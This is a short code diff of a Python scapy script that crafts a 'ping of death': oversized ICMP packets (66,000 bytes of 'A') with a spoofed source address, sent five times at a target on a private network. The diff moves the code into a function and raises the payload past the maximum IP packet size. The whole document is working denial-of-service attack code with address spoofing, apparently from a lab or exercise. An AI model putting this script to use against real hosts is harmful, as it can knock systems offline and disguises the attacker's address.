@@ -1,12 +1,10 @@
-#!/usr/bin/python
-
 from scapy.all import *
 
-SOURCE_IP = "10.1.5.3" # Change this IP to spoof
+# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
 TARGET_IP = "10.1.5.2"
-MESSAGE = "A"
-NUMBER_PACKETS=5 # Number of pings
+NUMBER_PACKETS = 5 # Number of pings
 
-pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
+def ping_of_death(SOURCE_IP = "10.1.5.3"):
+    ping_of_death = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/("A"*66000)
 
-send(NUMBER_PACKETS * pingOFDeath)
+    send(NUMBER_PACKETS * ping_of_death)
